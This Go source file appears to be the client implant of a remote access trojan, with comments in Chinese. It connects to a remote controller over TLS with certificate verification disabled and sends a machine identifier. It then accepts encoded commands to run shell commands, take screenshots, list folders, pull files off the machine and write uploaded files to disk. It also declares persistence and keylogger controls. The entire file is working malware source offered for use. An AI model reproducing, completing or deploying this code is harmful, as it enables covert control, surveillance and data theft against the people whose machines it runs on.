package work

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/phil-fly/generate/pool/folder"
	"github.com/phil-fly/generate/pool/osinfo"
	"io/ioutil"
	"log"
	"time"
)

type ControlType string

var (
	//UploadFile	文件类:目录查看
	FolderList ControlType = "FolderList"
	//UploadFile	文件类:文件上传
	UploadFile ControlType = "UploadFile"
	//DownloadFile	文件类:文件下载
	DownloadFile ControlType = "DownloadFile"

	//CommandExec	指令类:命令执行
	CommandExec ControlType = "CommandExec"
	//ScreenShot	指令类:截屏
	ScreenShot ControlType = "ScreenShot"
	//Lockscreen	指令类:锁屏
	Lockscreen ControlType = "Lockscreen"
	//Persistence_enable	指令类:开启持久化
	Persistence_enable ControlType = "Persistence_enable"
	//Persistence_disable	指令类:取消持久化
	Persistence_disable ControlType = "Persistence_disable"

	//Keylogger_start	指令类:开启键盘记录
	Keylogger_start ControlType = "Keylogger_start"
	//Keylogger_show	指令类:查看键盘记录
	Keylogger_show ControlType = "Keylogger_show"
	//Keylogger_stop	指令类:停止键盘记录
	Keylogger_stop ControlType = "Keylogger_stop"
)

func (c ControlType)String() string {
	switch c {
	case FolderList:
		return "FolderList"
	case UploadFile:
		return "UploadFile"
	case DownloadFile:
		return "DownloadFile"
	case CommandExec:
		return "CommandExec"
	case ScreenShot:
		return "ScreenShot"
	case Lockscreen:
		return "Lockscreen"
	case Persistence_enable:
		return "Persistence_enable"
	case Persistence_disable:
		return "Persistence_disable"
	case Keylogger_start:
		return "Keylogger_start"
	case Keylogger_show:
		return "Keylogger_show"
	case Keylogger_stop:
		return "Keylogger_stop"
	}
	return ""
}

func (c ControlType) ZString() string {
	switch c {
	case FolderList:
		return "目录查看"
	case UploadFile:
		return "上传文件"
	case DownloadFile:
		return "下载文件"
	case CommandExec:
		return "命令执行"
	case ScreenShot:
		return "截屏"
	case Lockscreen:
		return "锁屏"
	case Persistence_enable:
		return "开启持久化"
	case Persistence_disable:
		return "取消持久化"
	case Keylogger_start:
		return "开启键盘监控"
	case Keylogger_show:
		return "查看键盘监控"
	case Keylogger_stop:
		return "停止键盘监控"
	}
	return ""
}

type RemoteOption struct {
	UUid	string     `json:"uuid"`
	Guid	string	`json:"guid"`
	Type ControlType `json:"type"`
	IsOK	bool	`json:"is_ok,omitempty"` //响应使用
	OptionCmd	string	`json:"option_cmd,omitempty"` //命令执行操作类型填充
	OptionDir	string	`json:"option_dir,omitempty"`
	OptionFile	string	`json:"option_file,omitempty"`
	FileContent	string	`json:"FileContent,omitempty"`
	Content	string	`json:"Content,omitempty"`		//命令执行结果
}

func String2ControlType(Type string) ControlType {
	switch Type {
	case "CommandExec":
		return "CommandExec"
	case "UploadFile":
		return "UploadFile"
	case "DownloadFile":
		return "DownloadFile"
	case "ScreenShot":
		return "ScreenShot"
	case "FolderList":
		return "FolderList"
	}
	return ""
}

func (r *RemoteOption)Validate() error {
	switch  {
	case r.Type.String() == "" :
		return errors.New("Unable to identify OptionType.")

	case r.Type == CommandExec && r.OptionCmd == "":
		return errors.New("parameter check error.")

	case r.Type == UploadFile && (r.OptionDir == "" || r.OptionFile == "" || r.FileContent == ""):
		return errors.New("parameter check error.")
	case r.Type == DownloadFile && (r.OptionDir == "" || r.OptionFile == ""):
		return errors.New("parameter check error.")
	}
	return nil
}

func (r *RemoteOption)load(str []byte) (error) {
	return json.Unmarshal(str, r)
}

func (r *RemoteOption)Tobytes() ([]byte,error) {
	if err := r.Validate(); err != nil {
		return nil, err
	}

	str, err := json.Marshal(r) //json序列化
	if err != nil {
		return nil,err
	}
	return str,nil
}

func NewRemoteOption() *RemoteOption {
	return &RemoteOption{}
}

//CommandExec 命令执行操作
func (r *RemoteOption) CommandExec(c *tls.Conn) error {
	r.Content = EncodeBytesToString(RunCmdReturnByte(r.OptionCmd))
	r.IsOK = true
	message, err := r.Tobytes()
	if err != nil {
		return err
	}
	SendBytesMessage(c,message)
	return nil
}

//ScreenShot 截屏操作
func (r *RemoteOption) ScreenShot(c *tls.Conn) error {
	r.Content = EncodeBytesToString(TakeScreenShot())
	r.IsOK = true
	message, err := r.Tobytes()
	if err != nil {
		return err
	}
	SendBytesMessage(c,message)
	return nil
}

//FolderList 目录查看
func (r *RemoteOption) FolderList(c *tls.Conn) error {
	OptionDir := string(DecodeToBytes(r.OptionDir))

	r.Content = EncodeBytesToString(folder.GetFolderlist(OptionDir))
	r.IsOK = true
	message, err := r.Tobytes()
	if err != nil {
		return err
	}
	SendBytesMessage(c,message)
	return nil
}

//DownloadFile 文件下载
func (r *RemoteOption)DownloadFile (c *tls.Conn) error {
	OptionDir := string(DecodeToBytes(r.OptionDir))
	OptionFile := string(DecodeToBytes(r.OptionFile))

	var OptionPath	string

	if OptionDir[len(OptionDir)-1] == '/' {
		OptionPath = OptionDir + OptionFile
	}else{
		OptionPath = OptionDir +"/"+ OptionFile
	}

	fmt.Println("download:", len(OptionPath),"=",OptionPath)
	file, err := ioutil.ReadFile(OptionPath)
	if err != nil {
		r.IsOK = false
		r.Content = ""
		message, err := r.Tobytes()
		if err != nil {
			return err
		}
		SendBytesMessage(c,message)
		return nil
	}

	r.FileContent = EncodeBytesToString(file)
	r.IsOK = true
	message, err := r.Tobytes()
	if err != nil {
		return err
	}
	SendBytesMessage(c,message)
	return nil
}

//UploadFile 文件上传
func (r *RemoteOption)UploadFile (c *tls.Conn) error {
	var OptionPath	string

	OptionDir := string(DecodeToBytes(r.OptionDir))
	OptionFile := string(DecodeToBytes(r.OptionFile))

	if OptionDir[len(OptionDir)-1] == '/' {
		OptionPath = OptionDir + OptionFile
	}else{
		OptionPath = OptionDir +"/"+ OptionFile
	}

	//文件内容
	FileContent := DecodeToBytes(r.FileContent)
	if string(FileContent) != "" {
		err := ioutil.WriteFile(OptionPath, FileContent, 777)
		if err != nil {
			r.IsOK = false
			r.Content = ""
			r.FileContent = ""
			message, err := r.Tobytes()
			if err != nil {
				return err
			}
			SendBytesMessage(c,message)
			return nil
		}
	}
	r.IsOK = true
	r.FileContent = ""
	message, err := r.Tobytes()
	if err != nil {
		return err
	}
	SendBytesMessage(c,message)
	return nil
}

func Connect() {
	// Create a connection

	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	conn, err := tls.Dial("tcp", RemoteAddr+":"+RemotePort, conf)
	if err != nil {
		log.Println(err)
		return
	}

	//conn, err := net.Dial("tcp", RemoteAddr+":"+RemotePort)

	// If don't exist a connection created than try connect to a new
	if err != nil {
		log.Println("[*] Connecting...")
		for {
			time.Sleep(1 * time.Second)
			Connect()
		}
	}
	guid,err := osinfo.AuniqueIdentifier()
	if guid == "" {
		guid = "123456"
	}
	SendMessage(conn, EncodeBytesToString([]byte(guid)))

	for {
		// When the command received aren't encoded,
		// skip switch, and be executed on OS shell.
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			conn.Close()
			Connect()
		}

		// When the command received are encoded,
		// decode message received, and test on switch
		decodedCommand, _ := base64.StdEncoding.DecodeString(command)
		remoteOption := NewRemoteOption()
		err = remoteOption.load(decodedCommand)
		if err != nil {
			time.Sleep(1*time.Second)
			conn.Close()
			Connect()
		}

		switch remoteOption.Type {
		case CommandExec:
			remoteOption.CommandExec(conn)
		case ScreenShot:
			remoteOption.ScreenShot(conn)
		case FolderList:
			remoteOption.FolderList(conn)
		case DownloadFile:
			remoteOption.DownloadFile(conn)
		case UploadFile:
			remoteOption.UploadFile(conn)
		}

	}
}